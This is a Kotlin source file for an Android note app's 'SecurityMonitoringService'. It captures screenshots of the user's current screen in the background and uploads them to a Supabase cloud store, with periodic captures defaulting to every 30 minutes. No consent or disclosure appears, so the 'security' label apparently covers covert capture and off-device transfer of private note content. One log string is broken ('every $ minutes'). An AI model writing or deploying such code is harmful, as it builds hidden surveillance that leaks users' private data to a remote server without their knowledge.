package com.noteapp.security

import android.app.Activity
import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Updated SecurityMonitoringService - Screenshots only (no test uploads)
 */
class SecurityMonitoringService(private val context: Context) {

    companion object {
        private const val TAG = "SecurityMonitoringService"

        // Default settings - only for screenshots now
        private const val DEFAULT_SCREENSHOT_INTERVAL_MINUTES = 30
    }

    private val securityMonitor = SecurityMonitor(context)
    private val cloudUploader = SupabaseUploader(context)

    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    /**
     * Initializes the security monitoring service
     */
    fun initialize() {
        Log.d(TAG, "Initializing security monitoring service with Supabase cloud upload (screenshots only)")
        // Removed test connection upload - no more automatic test uploads
    }

    /**
     * Performs a security check with Supabase cloud upload (screenshots only)
     * @param activity The current activity
     */
    fun performSecurityCheck(activity: Activity) {
        coroutineScope.launch {
            try {
                Log.d(TAG, "🔍 Starting security check with Supabase upload (screenshots only)...")

                var uploadSuccess = false

                // Capture screenshot
                val screenshotFile = securityMonitor.captureScreenshot(activity)

                if (screenshotFile != null) {
                    // Screenshot captured successfully, try to upload to Supabase
                    val screenshotResult = cloudUploader.uploadScreenshot(screenshotFile)
                    if (screenshotResult != null) {
                        Log.d(TAG, "📸 Screenshot uploaded to Supabase: $screenshotResult")
                        uploadSuccess = true
                    } else {
                        Log.w(TAG, "⚠️ Failed to upload screenshot to Supabase")
                    }
                } else {
                    Log.w(TAG, "Screenshot capture failed, trying alternative method...")
                }

                if (uploadSuccess) {
                    Log.d(TAG, "✅ Security check completed successfully with screenshot upload")
                } else {
                    Log.w(TAG, "⚠️ Security check completed but screenshot upload failed (check local storage)")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Error performing security check: ${e.message}", e)
            }
        }
    }

    /**
     * Schedules periodic security checks (screenshots only)
     */
    fun schedulePeriodicChecks(
        screenshotIntervalMinutes: Int = DEFAULT_SCREENSHOT_INTERVAL_MINUTES
    ) {
        Log.d(TAG, "Scheduling periodic Supabase screenshot uploads every $ minutes")

        // In a real implementation, this would set up WorkManager periodic tasks
        // For now, we'll just log that it would be scheduled
    }

    /**
     * Stops all scheduled security checks
     */
    fun stopPeriodicChecks() {
        Log.d(TAG, "Stopping all periodic security checks")
        // In a real implementation, this would cancel WorkManager tasks or AlarmManager alarms
    }
}